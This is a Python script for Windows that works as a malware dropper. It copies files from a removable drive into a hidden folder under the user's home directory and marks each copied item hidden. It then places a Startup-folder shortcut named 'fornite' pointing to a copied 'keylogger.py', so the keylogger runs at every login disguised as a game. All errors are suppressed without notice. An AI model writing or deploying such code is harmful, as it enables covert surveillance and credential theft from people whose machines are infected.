import os
import shutil
import winshell
from win32com.client import Dispatch

def hide_file(file_path):

    try:
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2) 
    except Exception as e:
        pass

def copy_to_startup(src, dst):
    if not os.path.exists(src):
        return

    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        try:
            if os.path.isdir(s):
                shutil.copytree(s, d)
                hide_file(d) 
            else:
                shutil.copy2(s, d)
                hide_file(d)  
        except Exception as e:
            pass

def create_shortcut(target, shortcut_name, startup_folder=True):
    
    if startup_folder:
        startup = winshell.startup()
    else:
        startup = winshell.programs()
    
    path = os.path.join(startup, shortcut_name + '.lnk')
    target = os.path.abspath(target)
    
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.save()
    except Exception as e:
        pass

def main():
    src = "E:/p"
    dst = os.path.join(os.path.expanduser("~"), ".kps_hidden")

    if not os.path.exists(dst):
        os.makedirs(dst)
        hide_file(dst) 

    copy_to_startup(src, dst)
    
    keylogger_path = os.path.join(dst, "keylogger.py")
    create_shortcut(keylogger_path, "fornite")
    
if __name__ == "__main__":
    main()
